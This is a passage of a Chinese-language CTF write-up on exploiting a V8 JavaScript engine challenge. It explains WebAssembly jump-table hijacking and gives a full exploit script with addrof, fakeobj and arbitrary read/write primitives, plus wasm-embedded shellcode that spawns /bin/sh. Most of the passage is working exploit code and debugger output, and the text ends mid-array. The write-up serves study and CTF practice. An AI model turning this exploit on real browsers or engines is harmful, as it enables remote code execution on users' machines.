<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br></pre></td></tr></table></figure>

<p>我们来看看这个版本下的<strong>Instance</strong>结构</p>
<p><img src="/img/article/v8-umdctf/image-20250617160901523.png" alt="image-20250617160901523"></p>
<p>进一步查看<strong>trusted_data</strong></p>
<p><img src="/img/article/v8-umdctf/image-20250617161041280.png" alt="image-20250617161041280"></p>
<p>其实与RWX段有关的代码只有<strong>jump_table_start</strong>，查看对应的汇编代码就能看到熟悉的东西了。即函数的lazy binding结构，类似于glibc的plt-got结构。</p>
<blockquote>
<p><strong>注：下图地址与上图不太一样，因为不是一次gdb的截图，但是都是对应默认的jump_table_start</strong></p>
</blockquote>
<p><img src="/img/article/v8-umdctf/image-20250617165824648.png" alt="image-20250617165824648"></p>
<p>可以看到，<strong>jump_start_table</strong>最终索引到了<code>WasmCompileLazy()</code>函数（可以理解为类似glibc的<code>libc_runtime_resolve()</code>），关于这个结构的具体运作机理，我会在下一篇文章中详细介绍，这里我只说明利用方法。</p>
<h3 id="1-寻找真实汇编地址"><a href="#1-寻找真实汇编地址" class="headerlink" title="1. 寻找真实汇编地址"></a>1. 寻找真实汇编地址</h3><p>首先需要正常调用一次函数，然后利用<code>%DebugPrint()</code>找到函数的真实代码地址（也就是懒加载后的地址）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(shell_wasm_instance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>经过懒加载后，代码的<strong>start_jump_table</strong>内容就会直接跳转真实代码地址，如图:</p>
<p><img src="/img/article/v8-umdctf/image-20250617171048953.png" alt="image-20250617171048953"></p>
<p>上图中的<code>0x8cb91817000</code>便是<strong>WasmTrustedInstanceData.jump_table_start</strong>，可以明显的看到代码此时已经变为了我们的浮点shellcode</p>
<h3 id="2-记录shellcode偏移"><a href="#2-记录shellcode偏移" class="headerlink" title="2. 记录shellcode偏移"></a>2. 记录shellcode偏移</h3><p>计算浮点shellcode距离原始<strong>jump_table_start</strong>的偏移，例如这里便是<code>0x89c</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0x8cb9181789c</span> - <span class="number">0x8cb91817000</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x89c</span></span><br></pre></td></tr></table></figure>

<p>利用<code>addrof()</code>和<code>arb_read()</code>进行对应的内存泄露</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM instance addr: 0x&quot;</span> + shell_wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_wasm_trusted_data_addr = <span class="title function_">arb_read</span>(shell_wasm_instance_addr + <span class="number">0x8n</span>)&gt;&gt;<span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM trusted data addr: 0x&quot;</span> + shell_wasm_trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> jump_table_start_addr = <span class="title function_">arb_read</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Jump Table Start addr: 0x&quot;</span> + jump_table_start_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = jump_table_start_addr + <span class="number">0x89cn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell code addr: 0x&quot;</span> + shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/img/article/v8-umdctf/image-20250617171835422.png" alt="image-20250617171835422"></p>
<h3 id="3-覆盖start-jump-table"><a href="#3-覆盖start-jump-table" class="headerlink" title="3. 覆盖start_jump_table"></a>3. 覆盖start_jump_table</h3><p>此时需要覆盖<strong>start_jump_table</strong>为真实shellcode地址.</p>
<blockquote>
<p><strong>但是需要注意，也是这一步最重要的信息</strong>: 需要在调用之前就需要将其中内容覆盖为真实shellcode地址，一旦函数不是初次调用，那么这里的覆盖将不会起到引导程序流的作用。具体逻辑将在下一篇文章详细讨论，也就是说，整体JS逻辑应该如下，第一次调用wasm函数就应当是已经进行过地址覆盖的情况:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM instance addr: 0x&quot;</span> + shell_wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_wasm_trusted_data_addr = <span class="title function_">arb_read</span>(shell_wasm_instance_addr + <span class="number">0x8n</span>)&gt;&gt;<span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM trusted data addr: 0x&quot;</span> + shell_wasm_trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> jump_table_start_addr = <span class="title function_">arb_read</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Jump Table Start addr: 0x&quot;</span> + jump_table_start_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = jump_table_start_addr + <span class="number">0x89cn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell code addr: 0x&quot;</span> + shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_">arb_write</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>, shell_code_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell_func</span>(); <span class="comment">//这里才是初次调用，并且直接进行执行流控制</span></span><br></pre></td></tr></table></figure>

<p>不出意外这样就可以getshell了,如下图</p>
<p><img src="/img/article/v8-umdctf/image-20250617172300832.png" alt="image-20250617172300832"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>经过我个人优化过的EXP如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">convertToHex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="title class_">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  u64_buf[<span class="number">0</span>] = <span class="title class_">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">  u64_buf[<span class="number">1</span>] = <span class="title class_">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">  <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi32</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line">  <span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line">  <span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line">  f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">BigInt</span>(u64_buf[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">        res = <span class="title function_">foo</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> corrupting_array = [<span class="number">0.1</span>, <span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> corrupted_array = [<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> buf_array = [&#123;&#125;];</span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>]) + <span class="number">0x1000_0000_0000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>] = <span class="title function_">itof</span>(overwrite); <span class="comment">//overwirte corrupted_array --&gt; length</span></span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>]) + <span class="number">0x1000_0000_0000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>] = <span class="title function_">itof</span>(overwrite); <span class="comment">//overwrite corrupted_array --&gt; elements --&gt; length </span></span><br><span class="line">    <span class="keyword">return</span> [corrupted_array, buf_array];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">1000</span>; index++) &#123;</span><br><span class="line">    </span><br><span class="line">    o = <span class="title function_">test</span>();</span><br><span class="line">    <span class="keyword">if</span> (o[<span class="number">0</span>].<span class="property">length</span> != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> leakArr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    o[<span class="number">1</span>][<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">9</span>])&gt;&gt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">9</span>] = <span class="title function_">itof</span>((addr&lt;&lt;<span class="number">32n</span>) + <span class="number">2n</span>);</span><br><span class="line">    <span class="keyword">return</span> o[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(leakArr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);</span><br><span class="line"></span><br><span class="line">    leakArr[<span class="number">0</span>] = <span class="title function_">itof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyshellcode</span>(<span class="params">addr, shellcode</span>) &#123;</span><br><span class="line">    addr = <span class="title class_">BigInt</span>(addr);</span><br><span class="line">    buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">    dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">    buf_addr = <span class="title function_">addrof</span>(buf);</span><br><span class="line">    backing_store_addr = <span class="title class_">BigInt</span>(buf_addr) + <span class="number">0x14n</span>;</span><br><span class="line">    <span class="title function_">arb_write</span>(backing_store_addr, <span class="title class_">BigInt</span>(addr));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      dataview.<span class="title function_">setUint32</span>(<span class="number">4</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span 